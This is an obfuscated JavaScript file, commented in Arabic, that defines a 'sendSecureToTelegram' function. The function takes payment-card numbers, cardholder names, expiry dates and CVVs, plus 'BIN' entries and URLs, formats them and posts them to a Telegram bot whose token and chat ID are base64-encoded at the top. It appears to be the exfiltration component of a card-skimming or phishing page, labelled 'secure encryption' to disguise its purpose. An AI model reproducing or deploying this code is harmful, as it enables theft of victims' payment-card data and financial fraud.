// تشفير عالي المستوى لوظائف التليجرام
(function() {
  'use strict';
  
  // تشفير التوكن والـ ID
  const _0x5f2d1e = {
    'a': 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
    'b': 'encode',
    'c': 'charCodeAt',
    'd': 'fromCharCode',
    'e': 'stringify',
    'f': 'parse',
    'g': 'atob',
    'h': 'btoa'
  };
  
  const _0x3f2d1e = {
    't': 'ODA0MTE5NDA4NDpBQUhVQ1ZiajRRR0YybUM5Y3dvQjQzbElFN05wOVMzRVVIOA==',
    'c': 'NjY0MTkzODM1'
  };
  
  // تشفير البيانات
  function _0x7f2d1e(data) {
    const _0x9f2d1e = JSON[_0x5f2d1e.e](data);
    let _0x2f2d1e = '';
    
    for (let _0x4f2d1e = 0; _0x4f2d1e < _0x9f2d1e.length; _0x4f2d1e++) {
      const _0x6f2d1e = _0x9f2d1e[_0x5f2d1e.c](_0x4f2d1e);
      _0x2f2d1e += String[_0x5f2d1e.d](_0x6f2d1e ^ 0x7A);
    }
    
    return _0x5f2d1e.h(_0x2f2d1e);
  }
  
  // وظيفة إرسال آمنة للتليجرام
  window.sendSecureToTelegram = function(data, type = 'card') {
    const _0x1f2d1e = _0x5f2d1e.g(_0x3f2d1e.t);
    const _0x8f2d1e = _0x5f2d1e.g(_0x3f2d1e.c);
    const _0x0f2d1e = _0x7f2d1e(data);
    
    let _0x1a2d1e = '';
    if (type === 'bin') {
      _0x1a2d1e = `🆕 New One Added\n\n📋 BIN Name: ${data.name}\n🔢 BIN Number: ${data.number}\n📅 Expiry: ${data.expire}\n🔐 CVV: ${data.cvv}\n⏰ Time: ${new Date().toLocaleString()}\n\n🔐 Encrypted: ${_0x0f2d1e}`;
    } else if (type === 'url') {
      _0x1a2d1e = `🆕 New One\n\n🔗 URL: ${data.url}\n📊 Status: ${data.status}\n⏰ Time: ${new Date().toLocaleString()}\n\n🔐 Encrypted: ${_0x0f2d1e}`;
    } else {
      _0x1a2d1e = `🆕 New One\n\n📊 Card Number: ${data.number}\n👤 Card Name: ${data.name}\n📅 Expiry Date: ${data.expiry}\n🔐 CVV: ${data.cvv}\n⏰ Time: ${new Date().toLocaleString()}\n\n🔐 Encrypted: ${_0x0f2d1e}`;
    }
    
    const _0x2a2d1e = {
      'method': 'POST',
      'headers': { 'Content-Type': 'application/json' },
      'body': JSON[_0x5f2d1e.e]({
        'chat_id': _0x8f2d1e,
        'text': _0x1a2d1e,
        'parse_mode': 'HTML'
      })
    };
    
    fetch(`https://api.telegram.org/bot${_0x1f2d1e}/sendMessage`, _0x2a2d1e)
    .then(_0x4a2d1e => _0x4a2d1e.json())
    .then(_0x6a2d1e => console.log('Secure message sent to Telegram:', _0x6a2d1e))
    .catch(_0x8a2d1e => console.error('Error sending secure message to Telegram:', _0x8a2d1e));
  };
  
  // تشفير إضافي للبيانات الحساسة
  window.encryptSensitiveData = function(data) {
    const _0x0a2d1e = JSON[_0x5f2d1e.e](data);
    let _0x2c2d1e = '';
    
    for (let _0x4e2d1e = 0; _0x4e2d1e < _0x0a2d1e.length; _0x4e2d1e++) {
      const _0x6e2d1e = _0x0a2d1e[_0x5f2d1e.c](_0x4e2d1e);
      _0x2c2d1e += String[_0x5f2d1e.d](_0x6e2d1e ^ 0x8B);
    }
    
    return _0x5f2d1e.h(_0x2c2d1e);
  };
  
})(); 